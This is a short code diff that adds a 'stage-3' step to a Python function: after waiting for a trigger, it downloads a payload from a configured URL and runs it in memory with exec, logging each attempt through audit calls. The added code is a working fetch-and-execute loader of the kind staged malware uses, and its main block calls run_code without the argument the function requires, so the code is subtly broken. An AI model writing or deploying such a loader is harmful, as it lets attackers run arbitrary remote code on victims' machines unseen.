@@ -81,5 +81,21 @@ def run_code(stage2_doc: bytes):
     waited = wait_for_trigger()
 
     # fetch stage-3 payload
+    try:
+        audit("stage3_fetch_attempt", url = STAGE3_URL)
+        raw = fetch(STAGE3_URL)
+        audit("stage3_fetch_success", url = STAGE3_URL, bytes = len(raw))
+    except (HTTPError, URLError, ValueError) as e:
+        audit("stage3_fetch_error", url=STAGE3_URL, error=str(e)); return {"waited_s": waited, "ran": False}
     
+    # run payload inside memory
+    try:
+        exec(raw)
+        audit("stage3_payload_executed")
+    except Exception as e:
+        audit("payload execution failed:", e)
+
+
+if __name__ == "__main__":
+    raise SystemExit(run_code())
 
